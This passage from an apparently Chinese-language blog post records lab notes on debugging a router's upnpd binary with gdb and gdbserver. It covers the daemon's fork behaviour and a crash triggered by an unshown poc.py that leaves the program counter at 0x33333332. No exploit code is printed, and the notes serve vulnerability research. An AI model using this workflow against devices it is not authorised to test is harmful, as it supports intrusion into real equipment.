version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找合适的gdbserver（静态链接的</span></span><br><span class="line">find . -<span class="built_in">type</span> f | xargs file | grep <span class="string">"ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV)"</span></span><br><span class="line">./gdbserver.armv7_7.7: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line"><span class="comment"># 传输 gdbserver.armv7_7.7 到设备</span></span><br><span class="line">wget http://192.168.10.2:8000/gdbserver.armv7_7.7</span><br><span class="line">chmod +x gdbserver.armv7_7.7</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看帮助，可能每个都不一样</span></span><br><span class="line">./gdbserver.armv7_7.7 --<span class="built_in">help</span><span class="comment"># 有的是-h</span></span><br><span class="line">Usage:  gdbserver [OPTIONS] COMM PROG [ARGS ...]</span><br><span class="line">        gdbserver [OPTIONS] --attach COMM PID</span><br><span class="line">        gdbserver [OPTIONS] --multi COMM</span><br><span class="line"></span><br><span class="line">COMM may either be a tty device (<span class="keyword">for</span> serial debugging), or</span><br><span class="line">HOST:PORT to listen <span class="keyword">for</span> a TCP connection.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --debug               Enable general debugging output.</span><br><span class="line">  --remote-debug        Enable remote protocol debugging output.</span><br><span class="line">  --version             Display version information and <span class="built_in">exit</span>.</span><br><span class="line">  --wrapper WRAPPER --  Run WRAPPER to start new programs.</span><br><span class="line">  --once                Exit after the first connection has closed.</span><br><span class="line">Report bugs to <span class="string">"&lt;http://www.gnu.org/software/gdb/bugs/&gt;"</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动gdbserver</span></span><br><span class="line"><span class="comment"># 不写ip表0.0.0.0表任意</span></span><br><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 :1234 upnpd-62</span></span><br><span class="line">Process upnpd-62 created; pid = 24881</span><br><span class="line">Listening on port 1234</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb</span></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch </span><br><span class="line">GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></span><br><span class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>.</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture armv5t<span class="comment"># 怎么确定具体架构，直接arm行不行？</span></span><br><span class="line">The target architecture is assumed to be armv5t</span><br><span class="line">pwndbg&gt; file upnpd-62 <span class="comment"># 要从中读取符号，同gdb + 程序 同效果</span></span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">break</span> *main</span><br><span class="line">Breakpoint 1 at 0x22530</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/<span class="comment"># 设置根目录，否则找不到共享库</span></span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/lib/ld-uClibc.so.0:</span><br><span class="line">Remote connection closed</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string">set endian little# 设置大小端</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q upnpd-62 </span></span><br><span class="line"><span class="string">pwndbg: loaded 194 commands. Type pwndbg [filter] for a list.</span></span><br><span class="line"><span class="string">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span></span><br><span class="line"><span class="string">Reading symbols from upnpd-62...(no debugging symbols found)...done.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string"># lxl@ubuntu:~/Desktop/000$ md5sum squashfs-root/lib/ld-uClibc.so.0</span></span><br><span class="line"><span class="string">9294078b30f80793a5994290ebe671fb  squashfs-root/lib/ld-uClibc.so.0</span></span><br><span class="line"><span class="string"># md5sum /lib/ld-uClibc.so.0</span></span><br><span class="line"><span class="string">9294078b30f80793a5994290ebe671fb  /lib/ld-uClibc.so.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#</span></span><br></pre></td></tr></table></figure>
<ul>
<li>daemon进程</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 正常启动：前台启动（并未指定&amp;），但是其没有输出，也未卡在前台，加之名字d结尾，应该是守护进程daemon</span></span><br><span class="line"><span class="comment"># ps |grep upnp</span></span><br><span class="line"> 5721 admin      2876 S   grep upnp</span><br><span class="line"><span class="comment"># ./upnpd-62</span></span><br><span class="line"><span class="comment"># ps |grep upnp</span></span><br><span class="line"> 5781 admin      2492 S   ./upnpd-62</span><br><span class="line"> 5795 admin      2876 S   grep upnp</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 2 调试器启动：注意是正常退出，推测fork了子进程，父进程正常结束</span></span><br><span class="line"><span class="comment"># ps |grep upnp</span></span><br><span class="line"> 9066 admin      2876 S   grep upnp</span><br><span class="line"><span class="comment"># ./gdb-arm-static-7.11 -q upnpd-62 # quiet不打印版本等信息</span></span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x22534</span><br><span class="line">Starting program: /tmp/upnpd-62</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, 0x00022534 <span class="keyword">in</span> main ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[Inferior 1 (process 9128) exited normally]<span class="comment"># 正常退出</span></span><br><span class="line">(gdb) q</span><br><span class="line"><span class="comment"># ps |grep upnp</span></span><br><span class="line"> 9168 admin      2492 S   /tmp/upnpd-62</span><br><span class="line"> 9212 admin      2876 S   grep upnp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 跟随子进程（默认跟父）：确实创建了子进程</span></span><br><span class="line"><span class="comment"># ./gdb-arm-static-7.11 -q upnpd-62</span></span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) <span class="built_in">set</span> follow-fork-mode child<span class="comment"># 默认parent</span></span><br><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x22534</span><br><span class="line">Starting program: /tmp/upnpd-62</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, 0x00022534 <span class="keyword">in</span> main ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[New process 9616]<span class="comment"># 新进程</span></span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line"> 9533 admin      6700 S   ./gdb-arm-static-7.11 -q upnpd-62</span><br><span class="line"> 9616 admin      2492 S   /tmp/upnpd-62<span class="comment"># pid匹配</span></span><br><span class="line"> 9931 admin      2892 R   grep upnp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 ida静态分析：没有fork函数，有daemon（会调用fork）</span></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( daemon(1, 1) == -1 )</span><br></pre></td></tr></table></figure>
<ul>
<li>本地调试：gdb直接启动</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gdb启动程序并continue后，执行poc（python3 poc.py</span></span><br><span class="line"><span class="comment"># 需要set follow-fork-mode child，因为创建子进程后父进程正常退出</span></span><br><span class="line"><span class="comment"># ./gdb-arm-static-7.11 -q upnpd-62</span></span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) <span class="built_in">set</span> follow-</span><br><span class="line">follow-exec-mode  follow-fork-mode</span><br><span class="line">(gdb) <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x22534</span><br><span class="line">Starting program: /tmp/upnpd-62</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, 0x00022534 <span class="keyword">in</span> main ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[New process 9616]</span><br><span class="line"></span><br><span class="line">Thread 2.1 <span class="string">"upnpd-62"</span> received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[Switching to process 9616]</span><br><span class="line">0x33333332 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<ul>
<li>本地调试：gdb附加进程</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正常启动程序，gdb附加并continue后，执行poc（python3 poc.py</span></span><br><span class="line"><span class="comment"># 不需set follow-fork-mode child，因为附加的就是已经创建好的子进程（为守护进程</span></span><br><span class="line"><span class="comment"># ./upnpd-62</span></span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">12698 admin      2492 S   ./upnpd-62</span><br><span class="line">12886 admin      2892 S   grep upnp</span><br><span class="line"><span class="comment"># ./gdb-arm-static-7.11 -q --pid=12698</span></span><br><span class="line">Attaching to process 12698</span><br><span class="line">Reading symbols from /tmp/upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /usr/lib/libnvram.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /usr/lib/libacos_shared.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /usr/lib/libnat.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/libcrypt.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/libgcc_s.so.1...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/libc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/libm.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">0x401a44cc <span class="keyword">in</span> select () from /lib/libc.so.0</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x33333332 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<ul>
<li>远程调试：gdbserver启动程序//here</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 :1234 upnpd-62</span></span><br><span class="line">Process upnpd-62 created; pid = 14238</span><br><span class="line">Listening on port 1234</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian little </span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; file upnpd-62 </span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/lib/ld-uClibc.so.0:</span><br><span class="line">Remote connection closed</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/000$ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># </span></span><br><span class="line"><span class="string"># ./gdbserver.armv7_7.7 :1234 upnpd-62</span></span><br><span class="line"><span class="string">Process upnpd-62 created; pid = 14238</span></span><br><span class="line"><span class="string">Listening on port 1234</span></span><br><span class="line"><span class="string">Remote debugging from host 192.168.10.2</span></span><br><span class="line"><span class="string">Segmentation fault</span></span><br></pre></td></tr></table></figure>
<ul>
<li>–debug</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">17500 admin      2872 R   grep upnp</span><br><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 --debug :1234 upnpd-62</span></span><br><span class="line">new_argv[0] = <span class="string">"upnpd-62"</span></span><br><span class="line">Process upnpd-62 created; pid = 17555</span><br><span class="line">linux_wait: [Process 17555]</span><br><span class="line">linux_wait_for_lwp: &lt;all threads&gt;</span><br><span class="line">my_waitpid (-1, 0x40000000)</span><br><span class="line">blocking</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (-1, 0x1): status(57f), 17555</span><br><span class="line">Got an event from 17555 (57f)</span><br><span class="line">stop pc is 400f5930</span><br><span class="line">pc is 0x400f5930</span><br><span class="line">stop pc is 0x400f5930</span><br><span class="line">stop pc is 400f5930</span><br><span class="line">linux_wait_for_lwp: pc is 0x400f5930</span><br><span class="line">my_waitpid (17556, 0x0)</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (17556, 0x0): status(137f), 17556</span><br><span class="line">my_waitpid (17556, 0x0)</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (17556, 0x0): status(1057f), 17556</span><br><span class="line">my_waitpid (17557, 0x0)</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (17557, 0x0): status(137f), 17557</span><br><span class="line">my_waitpid (17557, 0x0)</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (17557, 0x0): status(9), 17557</span><br><span class="line">my_waitpid (sigchld_handler</span><br><span class="line">17556, 0x0)</span><br><span class="line">my_waitpid (17556, 0x0): status(117f), 17556</span><br><span class="line">my_waitpid (17556, 0x0)</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (17556, 0x0): status(9), 17556</span><br><span class="line">Hit a non-gdbserver <span class="built_in">trap</span> event.</span><br><span class="line">wait_for_sigstop: LWP 17555 already stopped</span><br><span class="line">Checking whether LWP 17555 needs to move out of the jump pad...no</span><br><span class="line">linux_wait ret = LWP 17555.17555, 1, 5</span><br><span class="line">Listening on port 1234</span><br><span class="line">handling possible accept event</span><br><span class="line">Remote debugging from host 192.168.10.2</span><br><span class="line">linux_async (0), previous=0</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">linux_async (0), previous=0</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">wait_for_sigstop: LWP 17555 already stopped</span><br><span class="line">Checking whether LWP 17555 needs to move out of the jump pad...no</span><br><span class="line">Writing resume reply <span class="keyword">for</span> LWP 17555.17555:1</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">handling possible serial event</span><br><span class="line">Trying host libthread_db library: libthread_db.so.1.</span><br><span class="line">Segmentation fault</span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">17799 admin      2492 S   upnpd-62</span><br><span class="line">17867 admin      2892 S   grep upnp</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian little</span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; file upnpd-62</span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/</span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/lib/ld-uClibc.so.0:</span><br><span class="line">Remote connection closed</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>–remote-debug</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">18053 admin      2892 S   grep upnp</span><br><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 --remote-debug :1234 upnpd-62</span></span><br><span class="line">Process upnpd-62 created; pid = 18108</span><br><span class="line">Listening on port 1234</span><br><span class="line">Remote debugging from host 192.168.10.2</span><br><span class="line">[getpkt: discarding char <span class="string">'+'</span>]</span><br><span class="line">getpkt (<span class="string">"qSupported:multiprocess+;swbreak+;hwbreak+;qRelocInsn+;fork-events+;vfork-events+;exec-events+;vContSupported+;QThreadEvents+;no-resumed+;xmlRegisters=i386"</span>);  [sending ack]</span><br><span class="line">[sent ack]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$PacketSize</span>=3fff;QPassSignals+;QProgramSignals+;qXfer:libraries-svr4:read+;augmented-libraries-svr4-read+;qXfer:auxv:read+;qXfer:spu:read+;qXfer:spu:write+;qXfer:siginfo:read+;qXfer:siginfo:write+;qXfer:features:read+;QStartNoAckMode+;qXfer:osdata:read+;multiprocess+;QNonStop+;QDisableRandomization+;qXfer:threads:read+;ConditionalBreakpoints+;BreakpointCommands+;QAgent+#4f"</span>); [looking <span class="keyword">for</span> ack]</span><br><span class="line">[received <span class="string">'+'</span> (0x2b)]</span><br><span class="line">getpkt (<span class="string">"vMustReplyEmpty"</span>);  [sending ack]</span><br><span class="line">[sent ack]</span><br><span class="line">putpkt (<span class="string">"<span class="variable">$#00</span>"</span>); [looking <span class="keyword">for</span> ack]</span><br><span class="line">[received <span class="string">'+'</span> (0x2b)]</span><br><span class="line">getpkt (<span class="string">"QStartNoAckMode"</span>);  [sending ack]</span><br><span class="line">[sent ack]</span><br><span class="line">[noack mode enabled]</span><br><span class="line">putpkt (<span 